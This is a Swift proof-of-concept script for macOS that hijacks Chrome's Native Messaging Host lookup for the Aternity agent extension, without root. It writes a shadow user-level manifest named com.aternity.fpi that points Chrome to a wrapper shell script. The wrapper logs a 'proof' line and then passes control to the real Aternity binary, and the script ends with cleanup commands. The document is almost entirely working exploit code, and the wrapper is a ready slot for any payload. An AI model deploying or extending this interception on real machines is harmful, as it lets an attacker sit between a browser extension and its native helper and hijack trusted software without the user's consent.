import Foundation

let fm = FileManager.default
let home = fm.homeDirectoryForCurrentUser.path

// Paths
let nmhDir = "\(home)/Library/Application Support/Google/Chrome/NativeMessagingHosts"
let nmhConfig = "\(nmhDir)/com.aternity.fpi.json"
let wrapperPath = "\(home)/Library/Application Support/wrapper.sh"
let proofLog = "/tmp/nmh_proof.txt"
let realBinary = "/Applications/AternityAgent.app/Contents/Helpers/AternityEUEChromeExtensionBridge"

// Shadow NMH config
let nmhJson = """
{
    "name": "com.aternity.fpi",
    "description": "Aternity Chrome Extension Bridge",
    "path": "\(wrapperPath)",
    "type": "stdio",
    "allowed_origins": [ "chrome-extension://apkpifdebpjmcdmjlajpfelbiidmlbbc/" ]
}
"""

// Wrapper script — logs proof then calls original binary
let wrapperScript = """
#!/bin/bash
echo "[$(date)] NMH Shadowing Success - Chrome NMH intercepted" >> \(proofLog)
exec \(realBinary) "$@"
"""

// Step 1: Create user-level NMH directory
do {
    try fm.createDirectory(atPath: nmhDir, withIntermediateDirectories: true)
    print("[OK] Created NMH directory: \(nmhDir)")
} catch {
    print("[ERROR] Failed to create NMH directory: \(error.localizedDescription)")
    exit(1)
}

// Step 2: Write shadow NMH config
do {
    try nmhJson.write(toFile: nmhConfig, atomically: true, encoding: .utf8)
    print("[OK] Shadow NMH config written to \(nmhConfig)")
} catch {
    print("[ERROR] Failed to write NMH config: \(error.localizedDescription)")
    exit(1)
}

// Step 3: Write wrapper script
do {
    try wrapperScript.write(toFile: wrapperPath, atomically: true, encoding: .utf8)
    print("[OK] Wrapper script written to \(wrapperPath)")
} catch {
    print("[ERROR] Failed to write wrapper: \(error.localizedDescription)")
    exit(1)
}

// Step 4: Set executable permission on wrapper
do {
    try fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: wrapperPath)
    print("[OK] Set executable permissions on wrapper")
} catch {
    print("[ERROR] Failed to set permissions: \(error.localizedDescription)")
    exit(1)
}

print("\n[DONE] NMH Shadow POC deployed (no root required)")
print("  Shadow config: \(nmhConfig)")
print("  Wrapper: \(wrapperPath)")
print("  Proof log: \(proofLog)")
print("\n[NEXT] Quit Chrome completely and reopen")
print("  Then check: cat \(proofLog)")
print("\n[CLEANUP]")
print("  rm \"\(nmhConfig)\"")
print("  rm \"\(wrapperPath)\"")
print("  rm \(proofLog)")
